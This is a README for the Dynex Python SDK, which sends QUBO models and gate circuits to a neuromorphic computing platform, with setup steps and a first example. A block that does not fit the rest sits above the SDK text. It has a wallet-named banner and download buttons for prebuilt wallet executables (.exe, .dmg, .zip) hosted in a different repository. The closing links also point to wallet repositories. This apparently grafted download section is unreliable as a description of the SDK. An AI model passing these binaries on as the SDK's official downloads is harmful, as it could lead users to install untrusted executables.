![Dynex SDK for the Dynex platform](assets/dynex-wallet-desktop-dnx-self-custody-app-banner.png)

# Dynex SDK

Python reference SDK for computing on the Dynex neuromorphic platform. The downloads below are the companion Dynex Wallet desktop app.

<p align="center"><a href="https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/latest"><img src="assets/badge-release.svg" alt="Release"></a></p>

## Downloads - v2.2.3

<p align="center"><a href="https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/latest/download/dynex-wallet-windows-v2.2.3.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/latest/download/dynex-wallet-macos-v2.2.3.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/latest/download/dynex-wallet-linux-x64-v2.2.3.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`dynex-wallet-windows-v2.2.3.exe`](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/latest/download/dynex-wallet-windows-v2.2.3.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`dynex-wallet-macos-v2.2.3.dmg`](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/latest/download/dynex-wallet-macos-v2.2.3.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`dynex-wallet-linux-x64-v2.2.3.zip`](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/latest/download/dynex-wallet-linux-x64-v2.2.3.zip) |


> [!IMPORTANT]
> This repository is a code sample kept for reference. It no longer receives updates, and the copy here is not the one to depend on. Install the current SDK with `pip install dynex`; the maintained source is published by the Dynex development team in the Dynex-Development/py-sdk repository, and the published `dynex` package is what runs on the platform today.

## What this repository does

The Dynex SDK is a set of Python tools for sending hard optimisation and sampling problems to the Dynex neuromorphic computing platform. It takes a problem written in a form Python developers already use, either a QUBO or BQM model from the annealing world or a gate-based circuit, and it handles the conversion, the upload, the queueing and the result that comes back. Your code stays ordinary Python: you build the model, you call the sampler, you read the answer.

Two kinds of problem are supported natively. Annealing style problems arrive through the Dimod interface, which means PyQUBO models and anything else that produces a BQM can be sampled without rewriting it. Gate-based circuits arrive through the circuit interface, which accepts the same objects Qiskit, Cirq, PennyLane and OpenQASM produce. Behind both interfaces sits the same platform, a network of GPUs running a digital twin of neuromorphic quantum hardware, and the SDK is the layer that decides how a given problem is expressed for it.

This repository is the reference copy of that SDK. The Dynex development team ships the current production package separately, and the `dynex` package on PyPI is the one to install when you want the maintained code. The reference copy remains useful for reading how the interfaces are put together, for the built documentation, and for the benchmark material that shows how circuit size affects runtime. That split matters when you report a problem: this tree explains the design, the installed package is what actually runs, so a reproduction should name the version you installed.

## Who uses it

Researchers and engineers who already model problems as QUBOs use the SDK to try those models on hardware without owning quantum equipment. A typical workflow starts small: build a ten variable model, sample it locally to check the formulation, then send the same model to the platform and compare. The free local sampler makes that loop cheap, and moving to the cloud is a change of sampler name rather than a rewrite.

Circuit authors come from the other direction. Someone with a Qiskit circuit for a small adder or a classification demo can run it through the SDK and see what the neuromorphic platform does with the same problem. Because the platform solves a 2-local Ising Hamiltonian with a single degree of freedom, it covers a subset of what a universal gate machine covers, and the SDK does not hide that: circuits that do not fit the model are reported rather than silently approximated.

Teaching and evaluation work is the third case. The example notebooks in the Codespace run end to end without a local install, which makes the SDK a reasonable way to show neuromorphic computing to a group without asking anyone to configure a machine.

## Setup

Install the package into a Python environment:

```
pip install dynex
```

Then confirm the import works and that the client can be created:

```
from dynex import Dynex
dn = Dynex()
```

For circuit work, install Qiskit alongside the SDK:

```
pip install qiskit
```

The SDK reads its platform configuration from the client you create, so a script that samples locally needs no credentials, and a script that sends work to the platform uses the account configuration you set for the client. Keep that configuration out of committed files.

## A first problem

A useful first test is a model small enough to check by hand: four or five binary variables with one clear best assignment. Build it with PyQUBO or directly as a BQM, sample it locally to confirm the assignment, then sample the same model on the platform and compare the two answers. If the local sampler and the platform agree, the model is well formed and the client configuration works; if they disagree, the model is usually the reason, and the local run shows that before any time goes into a queue.

## Contents

- The Python package source, which holds the sampler classes, the circuit and annealing interfaces, and the client that talks to the platform.
- `docs/_build/html`, the built HTML documentation that describes the interfaces and the samplers in their published form.
- `circuit_scaling_benchmark`, the benchmark material for circuit size against runtime, with the figures used to describe scaling.
- `img`, the figures referenced by the documentation and by the benchmark write-up.

## Documentation and license

The built documentation in `docs/_build/html` is the primary reference for the interfaces, and the [Dynex Wallet guides repository](https://github.com/Dynex-project/Dynex-Wallet-Docs) carries the getting started walkthrough for a first job. The companion desktop wallet, which holds and receives DNX, is published in the [main repository](https://github.com/Dynex-project/Dynex-Desktop-Wallet). The Dynex package is distributed under the GNU General Public License version 3, as its README states.
